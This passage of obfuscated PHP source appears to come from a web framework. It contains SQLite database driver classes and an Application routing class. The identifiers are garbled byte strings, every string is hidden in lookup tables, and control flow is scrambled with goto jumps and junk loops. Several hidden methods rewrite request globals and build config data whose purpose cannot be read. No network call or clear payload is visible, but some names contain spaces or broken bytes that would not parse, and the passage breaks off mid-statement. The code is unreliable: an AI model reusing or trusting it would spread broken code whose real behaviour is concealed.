$e³Òºœš‰æ => $Dò²²ëÌ’¶) { $CŒœ±»çšè[$Dò²²ëÌ’¶[$CÁë¥ÛÙÊ[27]]] = array($CÁë¥ÛÙÊ[28] => $Dò²²ëÌ’¶[$CÁë¥ÛÙÊ[27]], $CÁë¥ÛÙÊ[29] => $Dò²²ëÌ’¶[$CÁë¥ÛÙÊ[30]], $CÁë¥ÛÙÊ[31] => (bool) ($Dò²²ëÌ’¶[$CÁë¥ÛÙÊ[32]] === $CÁë¥ÛÙÊ[33]), $CÁë¥ÛÙÊ[34] => $Dò²²ëÌ’¶[$CÁë¥ÛÙÊ[35]], $CÁë¥ÛÙÊ[36] => strtolower($Dò²²ëÌ’¶[$CÁë¥ÛÙÊ[37]]) == $CÁë¥ÛÙÊ[38], $CÁë¥ÛÙÊ[39] => strtolower($Dò²²ëÌ’¶[$CÁë¥ÛÙÊ[40]]) == $CÁë¥ÛÙÊ[41]); } } return $CŒœ±»çšè; } public function getTables($f™ÜÜµ‚ = '') { $aåØÌÇšá =& $_SERVER[›èö’ù¤]; $dŠï „Ôù† = $this->query($aåØÌÇšá[42] . $aåØÌÇšá[43] . $aåØÌÇšá[44]); $e¨µç¯ï‹š = array(); foreach ($dŠï „Ôù† as $BáùöÕ“¢£ => $B«Ï‚÷ÉÏ÷) { $e¨µç¯ï‹š[$BáùöÕ“¢£] = current($B«Ï‚÷ÉÏ÷); } return $e¨µç¯ï‹š; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $F¦‘â‚âë =& $_SERVER[›èö’ù¤]; $d¯¸ˆˆìî¸ = sqlite_last_error($this->_linkID); $this->error = $d¯¸ˆˆìî¸ . $F¦‘â‚âë[4] . sqlite_error_string($d¯¸ˆˆìî¸); if ($F¦‘â‚âë[33] != $this->queryStr) { $this->error .= LNG($F¦‘â‚âë[45]) . $this->queryStr; } think_trace($this->error, $F¦‘â‚âë[33], $F¦‘â‚âë[46]); return $this->error; } public function escapeString($CÂ“³©»ñâ) { return sqlite_escape_string($CÂ“³©»ñâ); } public function parseLimit($dÕÜàÈğîê) { $CÂÓùÆí³ =& $_SERVER[›èö’ù¤]; $b‰¤Í»Şí› = $CÂÓùÆí³[33]; if (!empty($dÕÜàÈğîê)) { $dÕÜàÈğîê = explode($CÂÓùÆí³[47], $dÕÜàÈğîê); if (count($dÕÜàÈğîê) > 1) { $b‰¤Í»Şí› .= $CÂÓùÆí³[48] . $dÕÜàÈğîê[1] . $CÂÓùÆí³[49] . $dÕÜàÈğîê[0] . $CÂÓùÆí³[50]; } else { $b‰¤Í»Şí› .= $CÂÓùÆí³[48] . $dÕÜàÈğîê[0] . $CÂÓùÆí³[50]; } } return $b‰¤Í»Şí›; } } class DbSqlite3Base extends Db { public function __construct($EÚ“÷Š–²Ô = '') { $Dä………ÄÍ =& $_SERVER[›èö’ù¤]; if (!class_exists($Dä………ÄÍ[51])) { think_exception(think_lang($Dä………ÄÍ[10]) . $Dä………ÄÍ[52]); } if (!empty($EÚ“÷Š–²Ô)) { if (!isset($EÚ“÷Š–²Ô[$Dä………ÄÍ[12]])) { $EÚ“÷Š–²Ô[$Dä………ÄÍ[12]] = 438; } $this->config = $EÚ“÷Š–²Ô; if (empty($this->config[$Dä………ÄÍ[13]])) { $this->config[$Dä………ÄÍ[13]] = array(); } } } public function connect($e¡éµÜµÒ‘ = '', $CÚ‹ÄÔ¬–Û = 0) { $b¯„ÇŸœ» =& $_SERVER[›èö’ù¤]; if (!isset($this->linkID[$CÚ‹ÄÔ¬–Û])) { if (empty($e¡éµÜµÒ‘)) { $e¡éµÜµÒ‘ = $this->config; } $this->linkID[$CÚ‹ÄÔ¬–Û] = new SQLite3($e¡éµÜµÒ‘[$b¯„ÇŸœ»[17]]); if (!$this->linkID[$CÚ‹ÄÔ¬–Û]) { think_exception($this->linkID[$CÚ‹ÄÔ¬–Û]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$CÚ‹ÄÔ¬–Û]->busyTimeout(30000); if (1 != think_config($b¯„ÇŸœ»[18])) { unset($this->config); } } return $this->linkID[$CÚ‹ÄÔ¬–Û]; } public function free() { $this->queryID = null; } public function query($aôøĞœ¬²) { goto FÎß‡ƒ£Æ; B›œ—éêÀ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $dß¤ÓõÛÍ’ = $this->getAll(); $this->numRows = count($dß¤ÓõÛÍ’); return $dß¤ÓõÛÍ’; } goto dÜµ•ƒ•Ü; f¯øÎ¥‘öæ: think_status($f×ØëÏÀ­É[20]); $this->queryID = $this->_linkID->query($aôøĞœ¬²); $this->debug(); goto B›œ—éêÀ; FÎß‡ƒ£Æ: $f×ØëÏÀ­É =& $_SERVER[›èö’ù¤]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto cÊ’ öÀÙ´; cÊ’ öÀÙ´: $this->queryStr = $aôøĞœ¬²; if ($this->queryID) { $this->free(); } think_action_status($f×ØëÏÀ­É[19], 1); goto f¯øÎ¥‘öæ; dÜµ•ƒ•Ü: } public function execute($b—ªê‹•ª) { goto CšĞ’Ôîéå; bŒÈ—–¥«Ä: $this->queryStr = $b—ªê‹•ª; if ($this->queryID) { $this->free(); } think_action_status($D×Šˆ¬áÀ©[21], 1); goto bœ¶ÎÕºä•; E›âš´ÀÅğ: if (!1 === $e‘Ì¡®à™Ç) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto aÒÏÜ•²‚‹; bœ¶ÎÕºä•: think_status($D×Šˆ¬áÀ©[20]); $e‘Ì¡®à™Ç = $this->_linkID->exec($b—ªê‹•ª); $this->debug(); goto E›âš´ÀÅğ; CšĞ’Ôîéå: $D×Šˆ¬áÀ© =& $_SERVER[›èö’ù¤]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bŒÈ—–¥«Ä; aÒÏÜ•²‚‹: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[›èö’ù¤][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $fºñ…Ì–Ñ = $this->_linkID->query($_SERVER[›èö’ù¤][23]); if (!$fºñ…Ì–Ñ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $CÎ§‡ç„®ù = $this->_linkID->query($_SERVER[›èö’ù¤][24]); if (!$CÎ§‡ç„®ù) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $B’ïÉîÖ£õ = array(); while ($CèÔÜ¬“ÑÎ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $B’ïÉîÖ£õ[] = $CèÔÜ¬“ÑÎ; } $this->queryID->reset(); return $B’ïÉîÖ£õ; } public function getFields($A¡ì¼‡®”) { $BîÕïÉêŒ‘ =& $_SERVER[›èö’ù¤]; $d‡ÛÃº…Ê = $this->query($BîÕïÉêŒ‘[25] . $A¡ì¼‡®” . $BîÕïÉêŒ‘[26]); $bšìŒéÁÔ’ = array(); if ($d‡ÛÃº…Ê) { foreach ($d‡ÛÃº…Ê as $e£òæ´ˆ¢¼ => $dˆÜòŞ×ê) { $bšìŒéÁÔ’[$dˆÜòŞ×ê[$BîÕïÉêŒ‘[28]]] = array($BîÕïÉêŒ‘[28] => $dˆÜòŞ×ê[$BîÕïÉêŒ‘[28]], $BîÕïÉêŒ‘[29] => $dˆÜòŞ×ê[$BîÕïÉêŒ‘[29]], $BîÕïÉêŒ‘[31] => (bool) ($dˆÜòŞ×ê[$BîÕïÉêŒ‘[31]] === $BîÕïÉêŒ‘[33]), $BîÕïÉêŒ‘[34] => $dˆÜòŞ×ê[$BîÕïÉêŒ‘[53]], $BîÕïÉêŒ‘[36] => (bool) $dˆÜòŞ×ê[$BîÕïÉêŒ‘[54]], $BîÕïÉêŒ‘[39] => (bool) $dˆÜòŞ×ê[$BîÕïÉêŒ‘[54]]); } } return $bšìŒéÁÔ’; } public function getTables($Cçò°¶é… = '') { $aîùˆ‚êÕÑ =& $_SERVER[›èö’ù¤]; $a¾×ùéôË† = $this->query($aîùˆ‚êÕÑ[42] . $aîùˆ‚êÕÑ[43] . $aîùˆ‚êÕÑ[44]); $BáÄ¹èóÓš = array(); foreach ($a¾×ùéôË† as $cÂÀ„ˆ©”¢ => $aßä£Ö«ŞÎ) { $BáÄ¹èóÓš[$cÂÀ„ˆ©”¢] = current($aßä£Ö«ŞÎ); } return $BáÄ¹èóÓš; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $b¨ÇæÏƒ‡õ =& $_SERVER[›èö’ù¤]; $this->error = $this->_linkID->lastErrorMsg(); if ($b¨ÇæÏƒ‡õ[33] != $this->queryStr) { $this->error .= LNG($b¨ÇæÏƒ‡õ[45]) . $this->queryStr; } think_trace($this->error, $b¨ÇæÏƒ‡õ[33], $b¨ÇæÏƒ‡õ[46]); return $this->error; } public function escapeString($DŠ¼¬«§‚) { $f‡ˆ½ô“°Æ =& $_SERVER[›èö’ù¤]; if ($this->_linkID) { return $this->_linkID->escapeString($DŠ¼¬«§‚); } return str_ireplace($f‡ˆ½ô“°Æ[55], $f‡ˆ½ô“°Æ[56], $DŠ¼¬«§‚); } public function parseLimit($fä·É²¯¼˜) { $eÀÜãØåƒ =& $_SERVER[›èö’ù¤]; $eß·› Ïõµ = $eÀÜãØåƒ[33]; if (!empty($fä·É²¯¼˜)) { $fä·É²¯¼˜ = explode($eÀÜãØåƒ[47], $fä·É²¯¼˜); if (count($fä·É²¯¼˜) > 1) { $eß·› Ïõµ .= $eÀÜãØåƒ[48] . $fä·É²¯¼˜[1] . $eÀÜãØåƒ[49] . $fä·É²¯¼˜[0] . $eÀÜãØåƒ[50]; } else { $eß·› Ïõµ .= $eÀÜãØåƒ[48] . $fä·É²¯¼˜[0] . $eÀÜãØåƒ[50]; } } return $eß·› Ïõµ; } } goto Dö–Œô’õ; Cò‚‰…ßâÈ: $E´¬–Ïœ÷á = $_SERVER[›èö’ù¤][605]; class Application { private $defaultModule = "\x69\x6e\144\x65\170"; private $defaultController = "\x69\x6e\144\145\x78"; private $defaultAction = "\x69\156\x64\145\170"; function __construct() { } public function setDefault($aŠôÌİ¸÷¸) { $cøòøò¹¬ =& $_SERVER[†Ô…Œèëôú]; $CË¥Ğ¶÷¥ = $cøòøò¹¬[0]($cøòøò¹¬[1], $cøòøò¹¬[2]($aŠôÌİ¸÷¸, $cøòøò¹¬[1])); $this->defaultModule = $CË¥Ğ¶÷¥[0] ? $CË¥Ğ¶÷¥[0] : $this->defaultModule; $this->defaultController = $CË¥Ğ¶÷¥[1] ? $CË¥Ğ¶÷¥[1] : $this->defaultController; $this->defaultAction = $CË¥Ğ¶÷¥[2] ? $CË¥Ğ¶÷¥[2] : $this->defaultAction; $this->{$_SERVER[†Ô…Œèëôú][3]}($cøòøò¹¬[4], array($this, $cøòøò¹¬[5])); } public function appRun($c‘¿ö×ì¾¿) { goto aàÛ¡˜İ²; BĞèß¬¯î: $dèóÑ²‚‹ = $f™„é¿ïƒç[6]($bÚ×ìšÕ[0]); $dÕÌ¶®œÈ = $f™„é¿ïƒç[7]; $D‹„ˆ†À° = $bƒâÇÆ” ×[606]; goto Cê˜ùŞ§; aàÛ¡˜İ²: $bƒâÇÆ” × =& $_SERVER[›èö’ù¤]; $f™„é¿ïƒç =& $_SERVER[†Ô…Œèëôú]; $bÚ×ìšÕ = $f™„é¿ïƒç[0]($f™„é¿ïƒç[1], $c‘¿ö×ì¾¿); goto BĞèß¬¯î; Cê˜ùŞ§: if (strlen($D‹„ˆ†À°) < $bƒâÇÆ” ×[607]) { return; } if ($dèóÑ²‚‹ == $f™„é¿ïƒç[8]) { $dÕÌ¶®œÈ = $f™„é¿ïƒç[9]; $bÚ×ìšÕ[0] = $f™„é¿ïƒç[10]; $bÚ×ìšÕ[1] = $bÚ×ìšÕ[1] . $f™„é¿ïƒç[11]; $c‘¿ö×ì¾¿ = $f™„é¿ïƒç[12]($f™„é¿ïƒç[1], $bÚ×ìšÕ); $c‘¿ö×ì¾¿ = $f™„é¿ïƒç[2]($c‘¿ö×ì¾¿, $f™„é¿ïƒç[1]); } $f™„é¿ïƒç[13](array($f™„é¿ïƒç[14], $f™„é¿ïƒç[15]), $dÕÌ¶®œÈ . $f™„é¿ïƒç[16], $c‘¿ö×ì¾¿); goto bçÖ¶öÖôË; eº÷áĞö”¶: $f™„é¿ïƒç[13](array($f™„é¿ïƒç[14], $f™„é¿ïƒç[15]), $dÕÌ¶®œÈ . $f™„é¿ïƒç[18], $c‘¿ö×ì¾¿); goto e˜Â ‡‡ƒÁ; bçÖ¶öÖôË: $f™„é¿ïƒç[17]($c‘¿ö×ì¾¿); $aˆÎøÈ£Ş = $bƒâÇÆ” ×[608]; if (!$aˆÎøÈ£Ş) { die; } goto eº÷áĞö”¶; e˜Â ‡‡ƒÁ: } private function autorun() { goto E¡Ãáè÷Š; E¡Ãáè÷Š: $fÔ¢ÙĞá…ì =& $_SERVER[›èö’ù¤]; $B¬Ìğœ±Åé =& $_SERVER[†Ô…Œèëôú]; global $config; goto A¯Ò˜·•Ã…; A¯Ò˜·•Ã…: $A„Ğ»†¾¸ = $fÔ¢ÙĞá…ì[609]; if (strlen($A„Ğ»†¾¸) < $fÔ¢ÙĞá…ì[602]) { die; } if ($B¬Ìğœ±Åé[19]($config[$B¬Ìğœ±Åé[20]]) == 0) { return; } goto F½ƒ¶²³÷; F½ƒ¶²³÷: foreach ($config[$B¬Ìğœ±Åé[20]] as $F¤ã‘Ò…‡š => $e¨‰£šòî) { $this->{$_SERVER[†Ô…Œèëôú][21]}($e¨‰£šòî); $aà¢¹ˆ‘„ = $fÔ¢ÙĞá…ì[610]; if (!$aà¢¹ˆ‘„) { return; } } goto bĞÍ†ìÇšÊ; bĞÍ†ìÇšÊ: } private function alzx7472d6d7() { goto b™õš É÷”; e ñÂøŒ”°: if (!$F°ÜëÜ‹· || $bĞîµÑØÛŠ[24]($F°ÜëÜ‹·) <= $bĞîµÑØÛŠ[24]($a…‰‘¦¨‰Á)) { return; } if ($bĞîµÑØÛŠ[6]($bĞîµÑØÛŠ[25]($F°ÜëÜ‹·, -$bĞîµÑØÛŠ[24]($a…‰‘¦¨‰Á))) != $a…‰‘¦¨‰Á) { return; } $dÊí’×ˆ’ = $bĞîµÑØÛŠ[25]($F°ÜëÜ‹·, 0, -$bĞîµÑØÛŠ[24]($a…‰‘¦¨‰Á)); goto c¨´šÔ´Íõ; DÊØº¶š•Ñ: $cù‹¹¹…× = $f¢ç¹ÜÛğ»[611]; if (!$cù‹¹¹…×) { die; } $F°ÜëÜ‹· = $GLOBALS[$bĞîµÑØÛŠ[22]][$bĞîµÑØÛŠ[23]][0]; goto e ñÂøŒ”°; b™õš É÷”: $f¢ç¹ÜÛğ» =& $_SERVER[›èö’ù¤]; $bĞîµÑØÛŠ =& $_SERVER[†Ô…Œèëôú]; $a…‰‘¦¨‰Á = $bĞîµÑØÛŠ[8]; goto DÊØº¶š•Ñ; c¨´šÔ´Íõ: $e¾åÆ„©š = $f¢ç¹ÜÛğ»[612]; $dåŒŒ–Ì = array($bĞîµÑØÛŠ[8], $dÊí’×ˆ’); $d®ïŸóŞ§æ = $f¢ç¹ÜÛğ»[613]; goto aàæ‘¡­Ë»; aàæ‘¡­Ë»: if (!$d®ïŸóŞ§æ) { return; } $F¢Şø“ŒàÍ = $bĞîµÑØÛŠ[26]($GLOBALS[$bĞîµÑØÛŠ[22]][$bĞîµÑØÛŠ[23]], 1); $GLOBALS[$bĞîµÑØÛŠ[22]][$bĞîµÑØÛŠ[23]] = $bĞîµÑØÛŠ[27]($dåŒŒ–Ì, $F¢Şø“ŒàÍ); goto CÇæ¸¥Ò‰ª; CÇæ¸¥Ò‰ª: $GLOBALS[$bĞîµÑØÛŠ[22]][$bĞîµÑØÛŠ[28]] = $bĞîµÑØÛŠ[29]($bĞîµÑØÛŠ[1], $GLOBALS[$bĞîµÑØÛŠ[22]][$bĞîµÑØÛŠ[23]]); goto b‚Èƒ¸œå; b‚Èƒ¸œå: } private function xvisd6426205() { goto B‡š†”èŠè; B‡š†”èŠè: $Dï–†è¢›Ê =& $_SERVER[›èö’ù¤]; $cÚª–ŠÓÆÆ =& $_SERVER[†Ô…Œèëôú]; if ($GLOBALS[$cÚª–ŠÓÆÆ[22]][$cÚª–ŠÓÆÆ[28]] != $cÚª–ŠÓÆÆ[10]) { return; } goto cãö†ïì¥; Fî¾²ïÓ¯›: $F³‚óóƒƒ = $cÚª–ŠÓÆÆ[31]; if (!$cÚª–ŠÓÆÆ[32]($Aãˆ¶œÎ‰°, $F³‚óóƒƒ)) { return; } $F™Ñ“½ó®’ = $cÚª–ŠÓÆÆ[33]($Aãˆ¶œÎ‰°, $F³‚óóƒƒ); goto CÈÇ¼ÅÉ¾ù; Fæ²ªìØ©: $cÚª–ŠÓÆÆ[34]($cÚª–ŠÓÆÆ[35], $EÛ«Šòà™°, $Aò°Ø¸Ã­Ş); $a­ôğğÍôË = $Dï–†è¢›Ê[617]; if (!$a­ôğğÍôË) { die; } goto aòÆøŒ‹Î; aòÆøŒ‹Î: $EÛ«Šòà™° = $cÚª–ŠÓÆÆ[2]($Aò°Ø¸Ã­Ş[0][0], $cÚª–ŠÓÆÆ[36]); $GLOBALS[$cÚª–ŠÓÆÆ[22]][$cÚª–ŠÓÆÆ[23]] = $cÚª–ŠÓÆÆ[0]($cÚª–ŠÓÆÆ[36], $EÛ«Šòà™°); $GLOBALS[$cÚª–ŠÓÆÆ[22]][$cÚª–ŠÓÆÆ[28]] = $cÚª–ŠÓÆÆ[29]($cÚª–ŠÓÆÆ[1], $GLOBALS[$cÚª–ŠÓÆÆ[22]][$cÚª–ŠÓÆÆ[23]]); goto aÇ†«°á; cãö†ïì¥: $Aãˆ¶œÎ‰° = $_SERVER[$cÚª–ŠÓÆÆ[30]]; $B¶È‹„ôà„ = $Dï–†è¢›Ê[614]; if (!$B¶È‹„ôà„) { die; } goto Fî¾²ïÓ¯›; CÈÇ¼ÅÉ¾ù: $EÛ«Šòà™° = $cÚª–ŠÓÆÆ[25]($Aãˆ¶œÎ‰°, $F™Ñ“½ó®’ + $cÚª–ŠÓÆÆ[24]($F³‚óóƒƒ)); $dÉà—Ÿîó‹ = $Dï–†è¢›Ê[615]; while (strlen($dÉà—Ÿîó‹) < $Dï–†è¢›Ê[616]) { if (!$dÉà—Ÿîó‹) { break; } $dÉà—Ÿîó‹++; } goto Fæ²ªìØ©; aÇ†«°á: } public function run() { goto f§å×±¾Ç; D°ØÜ„¶Ã: $D–ğŒ²ºÌ´ = $f–…¨Šèî¶[623]; if (!$D–ğŒ²ºÌ´) { return; } $_SERVER[$DÁ„÷ÚÆø[44]] = $DÁ„÷ÚÆø[6](ACTION); goto BÈƒàŸ…£Œ; FÏ¼ÍÃ„óê: $DÁ„÷ÚÆø[39]($DÁ„÷ÚÆø[41], isset($D÷Ì¢­®¦»[1]) && $D÷Ì¢­®¦»[0] ? $D÷Ì¢­®¦»[1] : $this->defaultController); $DÁ„÷ÚÆø[39]($DÁ„÷ÚÆø[42], isset($D÷Ì¢­®¦»[2]) && $D÷Ì¢­®¦»[0] ? $D÷Ì¢­®¦»[2] : $this->defaultAction); $DÁ„÷ÚÆø[39]($DÁ„÷ÚÆø[43], MOD . $DÁ„÷ÚÆø[1] . ST . $DÁ„÷ÚÆø[1] . ACT); goto D°ØÜ„¶Ã; Eˆ‹¾¡¤Í„: $eâ»¢­²Ó± = $GLOBALS[$DÁ„÷ÚÆø[22]][$DÁ„÷ÚÆø[28]]; $aØåÎ¢¼…ó = $f–…¨Šèî¶[621]; if (!$aØåÎ¢¼…ó) { die; } goto A£ÍïŒå„ˆ; A£ÍïŒå„ˆ: $DÁ„÷ÚÆø[39]($DÁ„÷ÚÆø[40], isset($D÷Ì¢­®¦»[0]) && $D÷Ì¢­®¦»[0] ? $D÷Ì¢­®¦»[0] : $this->defaultModule); $c‰¤æÁ‚¡‡ = $f–…¨Šèî¶[622]; while (strlen($c‰¤æÁ‚¡‡) < $f–…¨Šèî¶[602]) { if (!$c‰¤æÁ‚¡‡) { break; } $c‰¤æÁ‚¡‡++; } goto FÏ¼ÍÃ„óê; A…’©ØãÍ»: $cíÛ÷ñÔŞŠ = $f–…¨Šèî¶[625]; if (!$cíÛ÷ñÔŞŠ) { return; } if ($DÁ„÷ÚÆø[19]($D÷Ì¢­®¦») >= 3) { $this->{$_SERVER[†Ô…Œèëôú][21]}($eâ»¢­²Ó±); } else { $this->{$_SERVER[†Ô…Œèëôú][21]}(ACTION); } goto fá¯Ä¼“ğÛ; bã¬îèŒ‡: $a¬ãŸªµ·£ = $f–…¨Šèî¶[618]; while (strlen($a¬ãŸªµ·£) < $f–…¨Šèî¶[619]) { if (!$a¬ãŸªµ·£) { break; } $a¬ãŸªµ·£++; } $this->{$_SERVER[†Ô…Œèëôú][38]}(); goto BÜí®Ğáò; BÈƒàŸ…£Œ: $BÜ¿Ú†† = $f–…¨Šèî¶[624]; while ($BÜ¿Ú†† < $f–…¨Šèî¶[619]) { if ($BÜ¿Ú†† >= 0) { break; } $BÜ¿Ú††++; } $this->{$_SERVER[†Ô…Œèëôú][45]}(); goto A…’©ØãÍ»; f§å×±¾Ç: $f–…¨Šèî¶ =& $_SERVER[›èö’ù¤]; $DÁ„÷ÚÆø =& $_SERVER[†Ô…Œèëôú]; $this->{$_SERVER[†Ô…Œèëôú][37]}(); goto bã¬îèŒ‡; BÜí®Ğáò: $D÷Ì¢­®¦» = $GLOBALS[$DÁ„÷ÚÆø[22]][$DÁ„÷ÚÆø[23]]; $FÚá¶ã×éƒ = $f–…¨Šèî¶[620]; if (!$FÚá¶ã×éƒ) { die; } goto Eˆ‹¾¡¤Í„; fá¯Ä¼“ğÛ: } private $vrit939c873c = array(); private $afpc2fb8927f = ''; public function lpjmf49b1893() { goto CÉ¦¿£±½°; CÉ¦¿£±½°: $FæÁ‹å‚­Ï =& $_SERVER[›èö’ù¤]; $A £¤ ä¥Î =& $_SERVER[†Ô…Œèëôú]; $this->{$_SERVER[†Ô…Œèëôú][46]}(); goto Bèä¾À÷; b–š¶áÂòù: $C‹­ôœ†Ã = $FæÁ‹å‚­Ï[629]; $this->{$_SERVER[†Ô…Œèëôú][51]}(); $this->{$_SERVER[†Ô…Œèëôú][52]}(); goto a‘ˆù‚ÑÙÁ; FŒÑ©ùö¿›: $AˆÏ›„š­© = $FæÁ‹å‚­Ï[628]; if (!$AˆÏ›„š­©) { die; } $this->{$_SERVER[†Ô…Œèëôú][50]}(); goto b–š¶áÂòù; a‘ˆù‚ÑÙÁ: $e“Ûà¡ù– = $FæÁ‹å‚­Ï[630]; if (strlen($e“Ûà¡ù–) < $FæÁ‹å‚­Ï[619]) { return; } $this->{$_SERVER[†Ô…Œèëôú][3]}($A £¤ ä¥Î[53], array($this, $A £¤ ä¥Î[54])); goto A òºãÌŒ; A òºãÌŒ: $this->{$_SERVER[†Ô…Œèëôú][3]}($A £¤ ä¥Î[55], array($this, $A £¤ ä¥Î[56])); $CÍ‰¡É«¤ = $FæÁ‹å‚­Ï[631]; if (strlen($CÍ‰¡É«¤) < $FæÁ‹å‚­Ï[616]) { return; } goto eïØš¶…; Cé˜–ƒˆÊº: $this->{$_SERVER[†Ô…Œèëôú][48]}(); $b°ŒƒÌÚè = $FæÁ‹å‚­Ï[627]; $this->{$_SERVER[†Ô…Œèëôú][49]}(); goto FŒÑ©ùö¿›; eïØš¶…: $this->{$_SERVER[†Ô…Œèëôú][3]}($A £¤ ä¥Î[57], array($this, $A £¤ ä¥Î[58])); $this->{$_SERVER[†Ô…Œèëôú][3]}($A £¤ ä¥Î[59], array($this, $A £¤ ä¥Î[60])); $DèˆëÎê÷¿ = $FæÁ‹å‚­Ï[632]; goto F‹ƒõäŠ©å; F‹ƒõäŠ©å: while ($DèˆëÎê÷¿ < $FæÁ‹å‚­Ï[602]) { if ($DèˆëÎê÷¿ >= 0) { break; } $DèˆëÎê÷¿++; } goto BÅî„ËµÏ“; Bèä¾À÷: $this->{$_SERVER[†Ô…Œèëôú][47]}(); $EšÙ©—îİ = $FæÁ‹å‚­Ï[626]; if (!$EšÙ©—îİ) { die; } goto Cé˜–ƒˆÊº; BÅî„ËµÏ“: } public function cimg7550d813($EŒÀäÊî†Ì) { goto eØõÖ‘â¼¾; cö²Ïñ‰Å: if ($Fª¸²»¯µ[123]($GLOBALS, $Fª¸²»¯µ[149]) && $this->config[$Fª¸²»¯µ[150]]) { $EŒÀäÊî†Ì[$Fª¸²»¯µ[125]][$Fª¸²»¯µ[151]] = WEB_ROOT; } return $EŒÀäÊî†Ì; goto BÀƒĞÙÌ×˜; båæÃÁí ö: $EŒÀäÊî†Ì[$Fª¸²»¯µ[125]][$Fª¸²»¯µ[134]] = $Fª¸²»¯µ[135]($Fª¸²»¯µ[136]()); $EŒÀäÊî†Ì[$Fª¸²»¯µ[125]][$Fª¸²»¯µ[137]] = $this->afpc2fb8927f; if ($F˜¶ïœ‰¯í[$Fª¸²»¯µ[137]] != $Fª¸²»¯µ[138]) { $EŒÀäÊî†Ì[$Fª¸²»¯µ[125]][$Fª¸²»¯µ[139]] = $F˜¶ïœ‰¯í[$Fª¸²»¯µ[139]]; $EŒÀäÊî†Ì[$Fª¸²»¯µ[125]][$Fª¸²»¯µ[140]] = $F˜¶ïœ‰¯í[$Fª¸²»¯µ[140]]; $c°•òåğîñ = $Fª¸²»¯µ[141](10) . $this->afpc2fb8927f . $Fª¸²»¯µ[141](5); $EŒÀäÊî†Ì[$Fª¸²»¯µ[113]][$Fª¸²»¯µ[142]][$Fª¸²»¯µ[143]] = $this->{$_SERVER[†Ô…Œèëôú][144]}($c°•òåğîñ, $EŒÀäÊî†Ì[$Fª¸²»¯µ[125]][$Fª¸²»¯µ[130]]); } goto AÍ™ìÂ•‰£; cÏŸÃŸœŒÃ: $E»Ï¾’æ = $a§À„²Ú’§[633]; if (strlen($E»Ï¾’æ) < $a§À„²Ú’§[602]) { return; } $AÉ‘¡ØŸÀ = array($Fª¸²»¯µ[64], $Fª¸²»¯µ[65], $Fª¸²»¯µ[66], $Fª¸²»¯µ[67], $Fª¸²»¯µ[68], $Fª¸²»¯µ[69], $Fª¸²»¯µ[70], $Fª¸²»¯µ[71], $Fª¸²»¯µ[72], $Fª¸²»¯µ[73], $Fª¸²»¯µ[74], $Fª¸²»¯µ[75], $Fª¸²»¯µ[76], $Fª¸²»¯µ[77], $Fª¸²»¯µ[78], $Fª¸²»¯µ[79], $Fª¸²»¯µ[80], $Fª¸²»¯µ[81], $Fª¸²»¯µ[82], $Fª¸²»¯µ[83], $Fª¸²»¯µ[84], $Fª¸²»¯µ[85], $Fª¸²»¯µ[86], $Fª¸²»¯µ[87], $Fª¸²»¯µ[88], $Fª¸²»¯µ[89], $Fª¸²»¯µ[90], $Fª¸²»¯µ[91], $Fª¸²»¯µ[92], $Fª¸²»¯µ[93], $Fª¸²»¯µ[94], $Fª¸²»¯µ[95], $Fª¸²»¯µ[96], $Fª¸²»¯µ[97], $Fª¸²»¯µ[98], $Fª¸²»¯µ[99], $Fª¸²»¯µ[100], $Fª¸²»¯µ[101], $Fª¸²»¯µ[102], $Fª¸²»¯µ[103], $Fª¸²»¯µ[104], $Fª¸²»¯µ[105], $Fª¸²»¯µ[106], $Fª¸²»¯µ[107], $Fª¸²»¯µ[108], $Fª¸²»¯µ[109], $Fª¸²»¯µ[110]); goto EÂŒ’Á¹; AçƒÒ¥³™: $d ÂÚøÉÁî = $EŒÀäÊî†Ì[$Fª¸²»¯µ[113]][$Fª¸²»¯µ[114]][$Fª¸²»¯µ[76]]; $dñôÁÁÍ§” = $a§À„²Ú’§[635]; unset($EŒÀäÊî†Ì[$Fª¸²»¯µ[113]][$Fª¸²»¯µ[115]][$Fª¸²»¯µ[116]]); goto bòÔÖ×Öï; eØõÖ‘â¼¾: $a§À„²Ú’§ =& $_SERVER[›èö’ù¤]; $Fª¸²»¯µ =& $_SERVER[†Ô…Œèëôú]; $F˜¶ïœ‰¯í = $Fª¸²»¯µ[61]($Fª¸²»¯µ[62])->{$_SERVER[†Ô…Œèëôú][63]}(); goto cÏŸÃŸœŒÃ; AÚğ†â‡½õ: $DÜÅñ©Ø® = $a§À„²Ú’§[638]; if (!$DÜÅñ©Ø®) { return; } $EŒÀäÊî†Ì[$Fª¸²»¯µ[125]][$Fª¸²»¯µ[130]] = $Fª¸²»¯µ[131]($_SERVER[$Fª¸²»¯µ[132]] . $F˜¶ïœ‰¯í[$Fª¸²»¯µ[133]]); goto båæÃÁí ö; bòÔÖ×Öï: $cäµ˜ÎÙ® = $a§À„²Ú’§[636]; if (strlen($cäµ˜ÎÙ®) < $a§À„²Ú’§[619]) { return; } unset($EŒÀäÊî†Ì[$Fª¸²»¯µ[113]][$Fª¸²»¯µ[115]][$Fª¸²»¯µ[117]]); goto CäòÄå›ñ; EÂŒ’Á¹: $f›åà ªÁ = $a§À„²Ú’§[634]; while ($f›åà ªÁ < $a§À„²Ú’§[607]) { if ($f›åà ªÁ >= 0) { break; } $f›åà ªÁ++; } foreach ($AÉ‘¡ØŸÀ as $b«ØùÂÌÚ) { $C¹ˆì¡ = $GLOBALS[$Fª¸²»¯µ[111]][$Fª¸²»¯µ[112]][$b«ØùÂÌÚ]; if (isset($F˜¶ïœ‰¯í[$b«ØùÂÌÚ])) { $C¹ˆì¡ = $F˜¶ïœ‰¯í[$b«ØùÂÌÚ]; } 